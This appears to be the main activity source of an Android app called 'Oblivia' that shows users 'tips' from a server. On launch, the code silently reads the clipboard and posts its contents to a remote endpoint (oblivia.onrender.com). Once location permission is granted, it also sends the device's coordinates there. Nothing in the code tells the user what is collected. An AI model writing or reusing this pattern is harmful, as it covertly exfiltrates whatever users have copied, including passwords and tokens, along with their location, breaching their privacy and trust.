package com.oblivia

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.View
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.android.gms.common.ConnectionResult
import com.google.android.gms.common.GoogleApiAvailability
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import com.google.android.gms.tasks.OnSuccessListener
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var db: TipDatabase
    private val TAG = "ObliviaApp"
    private val LOCATION_PERMISSION_REQUEST_CODE = 1234
    private val LOCATION_TIMEOUT = 5000L // 5 seconds timeout
    
    override fun onCreate(savedInstanceState: Bundle?) {
        try {
            super.onCreate(savedInstanceState)
            setContentView(R.layout.activity_main)
            
            Log.d(TAG, "Initializing database")
            db = TipDatabase.getDatabase(this)
            
            Log.d(TAG, "Initializing location services")
            fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
            
            Log.d(TAG, "Getting clipboard text")
            val clipboardText = ClipboardListener.getClipboardText(this)
            if (!clipboardText.isNullOrEmpty()) {
                sendChaosToServer(clipboardText)
            }
            
            // Always continue app initialization first
            continueAppInitialization()
            
            // Then check if Google Play Services is available before requesting location
            if (checkPlayServices()) {
                // Check and request location permissions if needed
                if (hasLocationPermission()) {
                    getLocationWithTimeout()
                } else {
                    requestLocationPermission()
                }
            } else {
                Log.d(TAG, "Google Play Services unavailable, skipping location")
            }
            
            // Add a button click listener to navigate to the main content
            findViewById<Button>(R.id.btnContinue).setOnClickListener {
                showMainContent()
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "Error in onCreate", e)
            // Continue with app initialization even if there's an error
            continueAppInitialization()
        }
    }
    
    private fun checkPlayServices(): Boolean {
        val googleApiAvailability = GoogleApiAvailability.getInstance()
        val resultCode = googleApiAvailability.isGooglePlayServicesAvailable(this)
        if (resultCode != ConnectionResult.SUCCESS) {
            if (googleApiAvailability.isUserResolvableError(resultCode)) {
                googleApiAvailability.getErrorDialog(this, resultCode, 1)?.show()
            } else {
                Log.e(TAG, "This device does not support Google Play Services")
            }
            return false
        }
        return true
    }
    
    private fun hasLocationPermission(): Boolean {
        return ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED
    }
    
    private fun requestLocationPermission() {
        ActivityCompat.requestPermissions(
            this,
            arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ),
            LOCATION_PERMISSION_REQUEST_CODE
        )
    }
    
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == LOCATION_PERMISSION_REQUEST_CODE) {
            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // Permission granted, get location
                getLocationWithTimeout()
            } else {
                // Permission denied, we already called continueAppInitialization in onCreate
                Log.d(TAG, "Location permission denied")
            }
        }
    }
    
    private fun getLocationWithTimeout() {
        val locationHandler = Handler(Looper.getMainLooper())
        val timeoutRunnable = Runnable {
            Log.d(TAG, "Location request timed out")
            // No need to call continueAppInitialization() again as it was called in onCreate
        }
        
        locationHandler.postDelayed(timeoutRunnable, LOCATION_TIMEOUT)
        
        try {
            getCurrentLocation { location ->
                locationHandler.removeCallbacks(timeoutRunnable) // Cancel timeout
                if (location != null) {
                    val locationText = "Lat: ${location.latitude}, Lon: ${location.longitude}"
                    sendChaosToServer(locationText)
                }
                // No need to call continueAppInitialization() again as it was called in onCreate
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error requesting location", e)
            locationHandler.removeCallbacks(timeoutRunnable) // Cancel timeout
            // No need to call continueAppInitialization() again as it was called in onCreate
        }
    }
    
    private fun continueAppInitialization() {
        // Update UI to show the app is ready
        runOnUiThread {
            try {
                findViewById<TextView>(R.id.tipTextView).text = "Welcome to Oblivia"
                // Make the continue button visible
                findViewById<Button>(R.id.btnContinue).isEnabled = true
                
                // Optionally, auto-navigate after a delay
                Handler(Looper.getMainLooper()).postDelayed({
                    // Only auto-navigate if we're still on this screen (user hasn't pressed button)
                    if (!isFinishing) {
                        showMainContent()
                    }
                }, 3000) // 3 second delay
                
            } catch (e: Exception) {
                Log.e(TAG, "Error updating UI in continueAppInitialization", e)
            }
        }
    }
    
    private fun showMainContent() {
        try {
            // Hide welcome elements
            findViewById<View>(R.id.welcomeContainer).visibility = View.GONE
            
            // Show main content elements
            findViewById<View>(R.id.mainContent).visibility = View.VISIBLE
            
            // Update the main content
            findViewById<TextView>(R.id.mainTextView).text = "You're now using OBLIVIA"
            
            Log.d(TAG, "Main content is now visible")
        } catch (e: Exception) {
            Log.e(TAG, "Error showing main content", e)
        }
    }
    
    // Function to get the current location
    private fun getCurrentLocation(onLocationReceived: (Location?) -> Unit) {
        try {
            fusedLocationClient.lastLocation
                .addOnSuccessListener(this, OnSuccessListener { location: Location? ->
                    onLocationReceived(location)
                })
                .addOnFailureListener { e ->
                    Log.e(TAG, "Error getting location", e)
                    onLocationReceived(null)
                }
        } catch (e: SecurityException) {
            Log.e(TAG, "Location permission not granted", e)
            onLocationReceived(null)
        } catch (e: Exception) {
            Log.e(TAG, "Error in getCurrentLocation", e)
            onLocationReceived(null)
        }
    }
    
    fun sendChaosToServer(chaos: String) {
        try {
            val client = OkHttpClient.Builder()
                .connectTimeout(10, TimeUnit.SECONDS)
                .readTimeout(10, TimeUnit.SECONDS)
                .build()
                
            val json = JSONObject().put("text", chaos)
            Log.d(TAG, "Sending to server: $chaos")
            
            val body = json.toString().toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url("https://oblivia.onrender.com/analyze")
                .post(body)
                .build()
            
            // Network request is independent of app initialization
            // We've already called continueAppInitialization() in onCreate
            
            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e(TAG, "Network request failed", e)
                    updateUIWithMessage("Connection error")
                }
                
                override fun onResponse(call: Call, response: Response) {
                    try {
                        val responseString = response.body?.string()
                        Log.d(TAG, "Server response: $responseString")
                        
                        if (!responseString.isNullOrEmpty()) {
                            val jsonObject = JSONObject(responseString)
                            val tip = jsonObject.optString("tip", "No tip available")
                            updateUIWithMessage(tip)
                        } else {
                            Log.d(TAG, "Empty response from server")
                            updateUIWithMessage("No tip available")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error processing response", e)
                        updateUIWithMessage("Error processing response")
                    }
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "Error in sendChaosToServer", e)
            // No need to call continueAppInitialization() again as it was called in onCreate
        }
    }
    
    private fun updateUIWithMessage(message: String) {
        runOnUiThread {
            try {
                findViewById<TextView>(R.id.tipTextView).text = message
            } catch (e: Exception) {
                Log.e(TAG, "Error updating UI with message", e)
            }
        }
    }
    
    companion object {
        private const val TAG = "ObliviaApp"
        
        // Make the function accessible to other classes
        @JvmStatic
        fun sendChaosToServerStatic(context: Context, chaos: String) {
            try {
                (context as? MainActivity)?.sendChaosToServer(chaos) 
                    ?: run {
                        // If not in MainActivity context, create a standalone request
                        Log.d(TAG, "Sending data from non-MainActivity context")
                        val client = OkHttpClient.Builder()
                            .connectTimeout(10, TimeUnit.SECONDS)
                            .readTimeout(10, TimeUnit.SECONDS)
                            .build()
                            
                        val json = JSONObject().put("text", chaos)
                        val body = json.toString().toRequestBody("application/json".toMediaType())
                        val request = Request.Builder()
                            .url("https://oblivia.onrender.com/analyze")
                            .post(body)
                            .build()
                        
                        client.newCall(request).enqueue(object : Callback {
                            override fun onFailure(call: Call, e: IOException) {
                                Log.e(TAG, "Static request failed", e)
                            }
                            
                            override fun onResponse(call: Call, response: Response) {
                                try {
                                    val responseString = response.body?.string()
                                    Log.d(TAG, "Static request response: $responseString")
                                } catch (e: Exception) {
                                    Log.e(TAG, "Error processing static response", e)
                                }
                            }
                        })
                    }
            } catch (e: Exception) {
                Log.e(TAG, "Error in sendChaosToServerStatic", e)
            }
        }
    }
}
